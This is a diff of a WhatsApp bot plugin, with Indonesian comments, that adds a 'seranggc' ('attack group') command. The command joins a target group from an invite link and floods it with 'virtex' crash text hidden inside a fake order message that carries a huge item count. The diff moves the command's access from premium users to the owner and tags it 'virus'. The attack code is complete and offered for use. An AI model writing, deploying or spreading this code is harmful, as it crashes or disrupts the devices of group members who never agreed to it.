@@ -10,21 +10,21 @@ const delay = ms => isNumber(ms) && new Promise(resolve => setTimeout(function (
 let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
 let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) => {
     if (!(isOwner || isPrems)) {
-        global.dfail("premium", m, conn)
+        global.dfail("owner", m, conn)
         throw false
     }
     if (!text) throw `Silahkan masukan link group target!\n\nContoh: ${usedPrefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstuvwxyz`;
     let [_, code] = text.match(linkRegex) || []
     if (!code) throw `Link salah cok!\ncontoh: ${usedPrefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstuvwxyz`;
     try {
-        m.reply('Sedang menyerang Gc.');
+        m.reply('_Sedang Menyerang Gc Yang BossQ Suruh..._');
         let target = await conn.groupAcceptInvite(code)
         let member = (await conn.groupMetadata(target)).participants.map(v => v.id)
         let ftroli = { key: { remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message: { orderMessage: { itemCount: 9999999999999999999999999999999999999999999999999999999, status: 1, surface: 1, message: virtex, orderTitle: 'HAI KAKK', sellerJid: '0@s.whatsapp.net' } } }
         let namagc = (await conn.groupMetadata(target)).subject || '';
         let react = await conn.sendMessage(target, {
             react: {
-                text: 'HALLO 👋',
+                text: 'HALLO OM 👋',
                 key: m.key
             }
         })
@@ -40,7 +40,7 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) =
             console.error(e)
             throw conn.groupLeave(target)
         })
-        await conn.reply(m.chat, `Sukses mengirim virtex ke grup @${namagc}`, m)
+        await conn.reply(m.chat, `Sukses Mengirim Virtex Ke Group BossQ @${namagc}`, m)
     } catch (e) {
         console.error(e)
         throw e
@@ -48,10 +48,9 @@ let handler = async (m, { conn, text, usedPrefix, command, isOwner, isPrems }) =
 }
 
 handler.help = ["seranggc", 'svigc'].map(v => v + ' <link>')
-handler.tags = ['premium']
+handler.tags = ['owner', 'virus']
 handler.command = /^s(erang|vi)?g(c|r(o|u)u?p)$/i
-
-handler.premium = true
+handler.owner = true
 
 module.exports = handler
 
